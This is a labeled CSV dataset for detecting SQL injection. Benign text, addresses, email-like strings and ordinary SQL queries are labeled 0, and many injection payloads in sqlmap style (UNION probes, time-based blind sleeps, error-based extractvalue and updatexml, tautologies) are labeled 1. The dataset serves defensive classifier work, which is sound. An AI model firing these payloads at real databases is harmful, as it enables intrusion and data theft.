Query,Label
"And, course, much force withdrawn proper life",0
1%' and 9127  =  7687--,1
"1'  )   union all select null,null#",1
el taxista 199 10?c,0
c3er2e4ue15,0
parmenia,0
"Frontier gone furthest area , though",0
0479266564613834,0
cercs,0
SELECT * FROM parent,0
4126502266405093,0
There man virtues,0
05301323f,0
"For one will, actions harmonious, however unlike seem",0
SELECT * FROM atomic FETCH FIRST 3 ROWS ONLY,0
"SELECT tired,zero,symbol FROM left LEFT JOIN Orders ON position.elephantID =  fairly.pink ORDER BY tropical.gas",0
"-1366' or make_set  (  9354  =  9354,7185  )   and 'abre'  =  'abre",1
1'+ ( select 'kiqf' where 5920 = 5920,1
berberisco,0
7406,0
"SELECT mindID AS ID, burst AS grade FROM stock",0
DELETE FROM weak WHERE increase = 'surprise',0
"SELECT towardID AS ID, needle AS influence FROM fly",0
13591,0
6o40o41,0
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367576 ),0
mcfarlan,0
The conclusions poll come surprise many,0
"cami sant cugat al papiol 59,",0
"SELECT angry, men, money FROM section WHERE throat  IS NULL",0
"1'+  (  select ounb where 4653  =  4653 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",1
"1'+  (  select dgnt where 4701  =  4701 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1'  )  )   as ticp where 9794 = 9794 union all select null,null,null,null,null,null,null,null--",1
SELECT * FROM laugh,0
"Republican obstructionism cannot explain allowing bugging foreign leaders , drones strike innocent children overseas",0
"1""  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""otgh"" like ""otgh",1
vasil9,0
"1""   )    )    as iubt where 8179  =  8179 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1 )  where 3740 = 3740 union all select null,null,null,null,null,null,null,null--",1
"1' and elt ( 3114 = 3114,sleep ( 5  )  )  #",1
SELECT * FROM harder WHERE atom = 'voyage'  OR transportation = 'those',0
"1%'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '%'  =  '",1
ulls,0
"1%'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   '%'  =  '",1
"1' and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'tmwy'  =  'tmwy",1
1' )  waitfor delay '0:0:5',1
SELECT AVG ( police )  FROM sang  SELECT SUM ( known ),0
"select * from users where id = 1 + $+%1 union select null,@@VERSION -- 1",1
"1'  )  )   )  and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and   (  (   ( 'nsji' = 'nsji",1
"1'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  'nsji'  =  'nsji",1
"SELECT action, stairs, cool FROM noun WHERE arm  IS NULL",0
nicomedes,0
"&quot; Some people life-endangering conditions require surgery , kids , &quot; said",0
plazuela de la fuente cantero 124,0
"-4136'   )    )    as cczp where 7052  =  7052 union all select 7052,7052,7052,7052,7052,7052,7052,7052,7052,7052#",1
1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,1
"c/ juan de bustamante, 30, 10b",0
"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )",1
guayabo,0
1'+  (  select 'diet' where 7004  =  7004 rlike sleep  (  5   )    )   +',1
SELECT RADIANS ( -45 ),0
canela,0
-7273%'   )    )    order by 1#,1
1796714227167241,0
63298862x,0
"1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'sxgl'  =  'sxgl",1
"1'  )  )   as xuab where 4369 = 4369 union all select null,null,null--",1
1'  )   where 5378  =  5378,1
chapman,0
mamakos@palodegolf.com.rw,0
The issue resolved evening,0
"9 billion September 30 , unchanged December 31",0
"1""   )    )    as tncm where 8203  =  8203 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
1'+  (  select 'drqj' where 1246  =  1246,1
1'  )   as nftr where 8825  =  8825 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
"SELECT * FROM gulf WHERE pen NOT IN  ( 'enough', 'do', 'women' )",0
"1  )  )   as zmsa where 6909 = 6909 union all select null,null,null,null,null,null,null#",1
SELECT COUNT ( result ) FROM gentle,0
7728,0
36930027p,0
22655130s,0
"select * from users where id = 1 or "",,"" = 1 or 1 = 1 -- 1",1
I suppose man violate nature,0
3411,0
1' )  or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #,1
-8080'   )    )    order by 1#,1
"&quot; Parenting stressful enough without extra limitations , especially &apos;t know gender child , &quot; told parenting website",0
"But arrive Yaounde , board , transportation instruction covered Bwelle",0
"select * from users where id = 1 or "" ) {"" or 1 = 1 -- 1",1
SELECT get ( s )  FROM smoke UNION,0
1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
"You learn great deal working doctor Africa , said Henne , example slow avoid burn-out",0
bollullos par del condado,0
dawson@eco-pro.to,0
"1'+ ( select 'zkum' where 5161 = 5161 union all select null,null,null,null#",1
4350,0
"1""  )  )   )  and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and   (  (   ( ""pnsz"" like ""pnsz",1
brias,0
"calle mariano garcia, s/n",0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'nczi'  =  'nczi",1
c4nt0rn,0
SELECT * FROM social WHERE run BETWEEN '1996-07-01' AND '1996-07-31',0
6775762435738331,0
3771,0
"SELECT * FROM magnet ORDER BY author, rush",0
SELECT * FROM clear WHERE Price NOT BETWEEN 10 AND 20,0
"calle olivos de pea nevada, 124,",0
-8057'   )    )    as gpue where 4205  =  4205 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
USA: Shots fired Los Angeles Airport On Friday morning (local time) unknown suspect fired shots LAX Airport,0
1  )   where 5651  =  5651,1
maitn,0
a,1
4662359455480921,0
"1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",1
bravat-a,0
lloros*o,0
"carrer jaume d'artes 78,",0
"1  )   as lfra where 2669  =  2669 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1
"Police women &apos;s associations South Africa , however , estimate number unreported cases sexual assault 10-25 times high",0
21,0
heal@quadernideilgarda.gob,0
UN Secretary-General Ban Ki-moon told summit overnight time &quot; rise national interests,0
"-4318"" )  as vpvt where 5543 = 5543 union all select 5543,5543,5543,5543,5543,5543--",1
0utaperc09,0
breanne,0
5980859147106836,0
tonicidad,0
SELECT AVG ( Price ) FROM chapter,0
pozaldez,0
SELECT * FROM surface WHERE trap = 'iron',0
02723270r,0
"1'   )    )    union all select null,null,null,null,null,null,null,null,null,null--",1
alvino,0
4881,0
SELECT * FROM more WHERE NOT height = 'bite'  AND NOT expression = 'aside',0
"1%""  )  )   )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( ""%"" = """,1
08281,0
17255,0
"SELECT * FROM eat ORDER BY forest, alone",0
briant,0
"SELECT column_name ( s )  FROM so,giant",0
"-9634'  )  )   )  union all select 4141,4141#",1
"c/ vallcorba 152, 7?f",0
"But arrive , receive true heroes &apos; welcome: feast , singing dancing , best accommodations community offer",0
5695,0
"SELECT somebody,sell FROM smaller WHERE ride = 'want' UNION SELECT held, during FROM gather",0
1 )  where 6304 = 6304,1
' -- &password =,1
"calle del derecho 17,",0
solonitsin3@neotelecom.fi,0
25260,0
"-9208%""  )  )   or 8571 = 8571--",1
"The administrative budget surplus , around EUR 1",0
1%'  )  )   and  ( 8853 = 9924 ) *9924 and   (  (  '%' = ',1
SELECT * FROM hungry FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM range,0
1'  )  )   and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (  'opyp' = 'opyp,1
SELECT * FROM office WHERE four IN  ( SELECT shelter FROM badly ),0
"&quot; In aerospace , results line guidance , low order intake overall market conditions disappointment , &quot; Beaudoin said",0
"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",1
soria,0
"select * from users where id = 1 or "", ( "" or 1 = 1 -- 1",1
"-2803' )  as jciy where 1130 = 1130 or make_set ( 4599 = 6550,6550 ) --",1
goldman@casabolsa43.rw,0
"1 )  and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
0861204544361308,0
8096640532589515,0
modugno@wdsl.int,0
And heavier devices laptops continue stowed concern might injure someone go flying around cabin,0
rusch de celis,0
edouard,0
1 )  as ryks where 1196 = 1196,1
emberrincharse,0
"-9087"" order by 1#",1
30666350j,0
buckner0,0
"-5560""   )    )    or 7292  =  6184#",1
SELECT TOP 50 PERCENT * FROM busy,0
SELECT AVG ( chemical ) FROM ants,0
"1   )    )    union all select null,null,null,null,null,null,null#",1
"1"" and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""krtr"" like ""krtr",1
"1'  )  )   procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and   (  (  'ywxe' like 'ywxe",1
1' where 2690  =  2690,1
"1%'  )  )   )  and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and   (  (   ( '%' = '",1
-6405%'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  '%'  =  ',1
SELECT DAYOFYEAR ( CURDATE (   )  ),0
"-3492"" where 4094 = 4094 or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) --",1
juzbado,0
"SELECT CONCAT_WS ( "" "", Address, PostalCode, City )  AS Address FROM  Customers;",0
"1%""  )  )   )  order by 1--",1
SELECT AVG ( molecular )  FROM week  SELECT SUM ( everywhere ),0
1'   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'yhku' like 'yhku,1
In June government revised estimated cost building high-speed link London North England £ 32,0
"SELECT Orders.nailsrID, Employees.automobile, Employees.activity FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.callID ORDER BY Orders.indeedID",0
aburelado,0
pelle1@906.com.aq,0
SELECT * FROM earth WHERE he  BETWEEN 10 AND 20,0
Sometimes need money quickly,0
sartaguda,0
"1,  (  select   (  case when   (  6857  =  7623  )   then 1 else 6857*  (  select 6857 from information_schema.character_sets  )   end   )    )",1
1' where 2673 = 2673,1
32411,0
galdino,0
"-4145%""  )  )   union all select 9404,9404,9404,9404,9404,9404,9404#",1
on,0
9004541540453342,0
herrera de los navarros,0
-3166'|| ( select 'mtan' from dual where 9420 = 9420 union all select 9420#,1
fortner,0
1'  )   as cdrm where 4595  =  4595 order by 1#,1
SELECT * FROM also WHERE pleasant  BETWEEN 10 AND 20,0
SELECT * FROM pain WHERE stay BETWEEN '1996-07-01' AND '1996-07-31',0
' or '' = ',1
"-2953"" )  or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and  ( ""oaeh"" = ""oaeh",1
dierkop@hayunmundoahifuera.id,0
6051283297189804,0
1' )  where 8776 = 8776 and 6969 =  ( select 6969 from pg_sleep ( 5  )  )  --,1
"1   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   4048  =  4048",1
"end and    (    (     (  ""%""  =  """,1
1'|| ( select 'dajl' from dual where 8440 = 8440,1
1 )  where 8041 = 8041,1
"1%""   )    )    union all select null,null--",1
4973,0
"There monitored extent , order control income",0
"1%""  )  )   and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --",1
1 )  and sleep ( 5 )  and  ( 4855 = 4855,1
"1'||  (  select 'jrbp' from dual where 4129  =  4129 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )",1
-3107' )  where 7782 = 7782 or 8571 = 8571--,1
trincha-32r1,0
whorf.laporte@sindualidad.fo,0
"-1868   )    )    union all select 1859,1859--",1
nogueras,0
31229,0
"c/ de las violetas, 104,",0
1  )  )   waitfor delay '0:0:5'--,1
SELECT * FROM firm FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM quite,0
9ar631i708ia,0
"SELECT * FROM fifth ORDER BY noon ASC, give DESC",0
1'+  (  select lptb where 3861  =  3861 or sleep  (  5   )    )   +',1
"1 )  where 8630 = 8630 union all select null,null--",1
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  (   ( 'qhgp' = 'qhgp",1
FROM  ( SELECT DISTINCT century FROM supply ),0
"1 )  as lejp where 5238 = 5238 union all select null,null,null,null,null#",1
SELECT * FROM market FETCH FIRST 50 PERCENT ROWS ONLY,0
"SELECT vapor AS flew, dog AS [cent]  FROM her",0
UPDATE broken SET may = 'universe'WHERE managed = 'dress',0
"1'  )   as bfgl where 8959  =  8959 union all select null,null,null,null,null,null,null,null,null,null--",1
"SELECT wide,step,adjective FROM proud LEFT JOIN Orders ON maybe.kitchenID =  belt.customs ORDER BY vertical.snake",0
select sleep ( 5 )  and 'mlmu' = 'mlmu,1
"Specially children , petting zoo , &quot; straw bouncy castle &quot; , tractor driving (under supervision) tractor surfing",0
vlahos,0
"SELECT variety, mixture, fastened FROM day WHERE chief  IS NULL",0
-9217 or 9323  =  9323#,1
san martn del castaar,0
salina-sonajew@almeriastella.vg,0
"SELECT brass,luck,town FROM left LEFT JOIN Orders ON feature.queenID =  daughter.mouse ORDER BY present.monkey",0
select   (  case when   (  6047  =  8897  )   then 6047 else 6047*  (  select 6047 from information_schema.character_sets  )   end  )  #,1
"-3074'   )    )    union all select 6131,6131,6131,6131,6131,6131,6131--",1
baggott@lamola-hotel.name,0
DELETE FROM stared WHERE system = 'whole',0
82839528z,0
leiding@ubuybetter.cat,0
SELECT AVG ( Price ) FROM beyond,0
alfonso,0
"1%""   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  ""%""  =  """,1
"-6363"" )  where 4043 = 4043 union all select 4043,4043,4043,4043,4043,4043,4043,4043,4043--",1
5599,0
"1'+ ( select 'uijv' where 7279 = 7279 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
But Mr Chen subsequently admitted television taken bribes fabricate stories part state-owned company,0
"1""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""tfrs""  =  ""tfrs",1
SELECT AVG ( wood ) FROM term SELECT SUM ( smile ),0
"select * from users where id = 1 union select  @ $,version (  )  -- 1",1
SELECT COUNT ( earID ) FROM leave,0
tra5i0o0ed7a,0
"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'imqi'  =  'imqi",1
3632,0
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  (  6977 = 6977",1
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  (  ""uidb"" like ""uidb",1
39419,0
"select * from users where id  =  1 or ""?["" or 1  =  1 -- 1",1
mackenzie.cointepas0@drivinn.lv,0
SELECT * FROM complex WHERE NOT nervous = 'slept'  AND NOT real = 'pie',0
"Among others , airports Kopenhagen , Frankfurt Dubai already done away noisy call-outs",0
calle clavel 30 11?b,0
"SELECT * FROM wp_posts WHERE  ( post_type  =  'page' AND post_status  =  'publish' )  AND post_parent  =  181 ORDER BY wp_posts.post_title ASC LIMIT 0,1",0
nishio@granbretana.com.ml,0
select pg_sleep ( 5 )  and   (  (  'vxxg' = 'vxxg,1
SELECT * FROM unless WHERE    NOT fine = 'comfortable',0
SELECT * FROM review WHERE known BETWEEN '1996-07-01' AND '1996-07-31',0
